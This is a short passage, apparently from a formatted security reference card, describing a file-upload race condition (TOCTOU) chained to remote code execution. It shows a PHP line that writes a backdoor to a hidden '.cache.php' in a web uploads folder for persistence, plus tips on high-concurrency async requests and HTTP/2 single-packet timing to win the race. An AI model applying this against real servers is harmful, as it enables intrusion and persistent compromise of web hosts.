  `@file_put_contents('/var/www/html/uploads/.cache.php', $backdoor)` — immediate persistence on race win
  ::

  ::field{name="Python Async" type="string"}
  `asyncio` + `aiohttp` with 100+ concurrent connections for highest throughput
  ::

  ::field{name="HTTP/2 Advantage" type="string"}
  Single-packet attack eliminates network jitter — all requests arrive simultaneously at the server
  ::
::

::badge
File Upload — Race Condition — TOCTOU — RCE Chain
::